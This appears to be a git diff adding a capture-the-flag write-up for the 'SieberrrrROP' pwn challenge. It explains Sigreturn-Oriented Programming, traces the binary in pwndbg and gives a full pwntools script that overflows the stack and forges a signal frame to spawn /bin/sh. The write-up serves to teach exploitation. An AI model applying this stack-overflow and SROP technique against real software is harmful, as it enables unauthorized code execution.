@@ -1410,4 +1410,153 @@ p.sendline(b'3')
 p.interactive()
 ```
 ## SieberrrrROP
+I tried this challenge after I recently learned about Sigreturn-Oriented Programming (SROP). Pretty nice solution honestly SROP is quite cool.  
+### Challenge protections
+![sieberrop](/assets/images/sieberr-pwn/Sieberop.png)
 
+### Source
+```
+global _start
+
+section .text
+_start:
+    ; Reserve 0x100 bytes on the stack for local buffer
+    enter 0x100, 0x0
+
+    ; Call the timer function to set an alarm
+    call set_alarm
+
+    ; Syscall: write(stdout, msg, msg_len)
+    mov rax, 0x1          ; syscall number for write
+    mov rdi, rax          ; file descriptor 1 (stdout)
+    lea rsi, [rel msg]    ; pointer to message
+    mov edx, msg_len      ; message length
+    syscall
+
+    ; Syscall: read(stdin, rsp, 0x1000)
+    xor eax, eax          ; syscall number 0 (read)
+    xor edi, edi          ; file descriptor 0 (stdin)
+    mov rsi, rsp          ; buffer on stack
+    mov edx, 0x1000       ; number of bytes to read
+    syscall
+
+    leave
+    ret
+
+set_alarm:
+    ; Syscall: alarm(15)
+    mov edi, 15
+    mov eax, 37           ; syscall number for alarm
+    syscall
+    ret
+
+section .data
+    msg: db "As a pup, the wolf YEARNED for the /bin/sh"
+    msg_len: equ $ - msg
+```
+We are given the Netwide Assembler (nasm) file. The program will start executing from `_start`. A good thing is that the source came with comments that tell us what the assembly is doing. Basically, it sets up a buffer of size 0x100, calls the `set_alarm` function which executes alarm(15), prints `msg` to stdout then allows us to read 0x1000 bytes into our buffer.  
+### Solve
+The first thing that came to my mind was to do a buffer overflow with a ROP chain to call a shell. However, if you run ROPgadget on the binary you will find that there are not really any suitable gadgets that we can use.  
+![ropgad](/assets/images/sieberr-pwn/ropgadget.png)
+In hindsight, perhaps it was quite obvious that this wasn't gonna work (but you never know...).  
+Anyways, we should capitalise on the fact that the challenge name literally hints heavily towards SROP.  
+#### SROP
+A little bit about Sigreturn-Oriented Programming first. `Signals` are asynchronous interrupts delivered to a process. On x86-64 Linux, when a signal is delivered the kernel would stop the current process. The process states (RIP,RSP... other general purpose registers) are then saved onto the `user stack` as a structure called a `signal frame`.  
+The kernel then redirects to a signal handler, and `SYS_rt_sigreturn` syscall is executed when it finishes. This syscall restores the old states from the stack. However, the kernel never checks if the `signal frame` was real. It just reads the memory at RSP, which if we control we can replace with our own `signal frame` and control code execution.  
+The whole idea of SROP is to place our fake `signal frame` on the stack and trick the kernel that a signal handler has just finished so that it restores the registers to whatever is in our `signal frame`. To do so, we just need to set the `RAX` register to 15 and execute a syscall for `SYS_rt_sigreturn` (Usually we can do this with `mov eax, 15;syscall` gadget).  
+#### Exploit
+Anyways, we already learned from our gadget dump that there is no such `mov eax, 15` gadget. So how else can we cause a sigreturn? Well the next logical step would be to look at the only out of place call in the program, `alarm`.  
+Looking at the man page for [alarm](https://man7.org/linux/man-pages/man2/alarm.2.html).  
+```
+RETURN VALUE         top
+       alarm() returns the number of seconds remaining until any
+       previously scheduled alarm was due to be delivered, or zero if
+       there was no previously scheduled alarm.
+```
+Thus, taking into account the fact that return integer values of functions on x86 are stored in `rax`, AND the fact that `set_alarm` conveniently calls an alarm for 15 seconds, we can control `rax` to be 15 by simply calling `set_alarm` twice.  
+Let's first figure out the addresses of all the stuff we need.  
+Offset to return address:
+```bash
+pwndbg> disass _start
+Dump of assembler code for function _start:
+   0x0000000000401000 <+0>:     enter  0x100,0x0
+   0x0000000000401004 <+4>:     call   0x40102f <set_alarm>
+   0x0000000000401009 <+9>:     mov    eax,0x1
+   0x000000000040100e <+14>:    mov    rdi,rax
+   0x0000000000401011 <+17>:    lea    rsi,[rip+0xfe8]        # 0x402000
+   0x0000000000401018 <+24>:    mov    edx,0x2a
+   0x000000000040101d <+29>:    syscall
+   0x000000000040101f <+31>:    xor    eax,eax
+   0x0000000000401021 <+33>:    xor    edi,edi
+   0x0000000000401023 <+35>:    mov    rsi,rsp
+   0x0000000000401026 <+38>:    mov    edx,0x1000
+   0x000000000040102b <+43>:    syscall
+   0x000000000040102d <+45>:    leave
+   0x000000000040102e <+46>:    ret
+End of assembler dump.
+pwndbg> b *_start+45
+Breakpoint 1 at 0x40102d
+pwndbg> r
+Starting program: /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/SieberrrrROP/dist/SieberrrrROP/vuln
+
+This GDB supports auto-downloading debuginfo from the following URLs:
+  <https://debuginfod.ubuntu.com>
+Debuginfod has been disabled.
+To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
+As a pup, the wolf YEARNED for the /bin/shaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
+Breakpoint 1, 0x000000000040102d in _start ()
+....
+pwndbg> x/gx $rbp+8
+0x7fffffffdcf0: 0x6261616161616169
+pwndbg> cyclic -l 0x6261616161616169
+Finding cyclic pattern of 8 bytes: b'iaaaaaab' (hex: 0x6961616161616162)
+Found at offset 264
+pwndbg> p/x 0x100+8
+$1 = 0x108
+pwndbg> p/i 0x100+8
+Format letter "i" is meaningless in "print" command.
+pwndbg> p/s 0x100+8
+$2 = 264
+```
+`/bin/sh`  
+```bash
+pwndbg> search /bin/sh
+Searching for byte: b'/bin/sh'
+vuln            0x402023 0x68732f6e69622f /* '/bin/sh' */
+```
+`set_alarm` and `syscall ; ret` gadget  
+```bash
+pwndbg> disass set_alarm
+Dump of assembler code for function set_alarm:
+   0x000000000040102f <+0>:     mov    edi,0xf
+   0x0000000000401034 <+5>:     mov    eax,0x25
+   0x0000000000401039 <+10>:    syscall
+   0x000000000040103b <+12>:    ret
+End of assembler dump.
+```
+As for the `signal frame`, pwntools has a very useful object `SigreturnFrame()` that we can use.  
+### Full solve script
+```python
+from pwn import *
+
+context.binary = './vuln'
+elf = context.binary
+p = process(elf.path)
+
+alarm = 0x40102f
+syscall_ret = alarm+10
+offset = 0x100 + 8
+binsh = 0x402023
+
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve #we want to call execve(/bin/sh,0,0)
+frame.rdi = binsh #address of /bin/sh
+frame.rsi = 0  
+frame.rdx = 0
+frame.rip = syscall_ret #actually i think we could just use syscall for this without a ret but doesnt matter
+
+
+payload = b'A'*offset + p64(alarm) + p64(alarm) +p64(syscall_ret)+ bytes(frame)
+p.sendline(payload)
+p.interactive()
+```
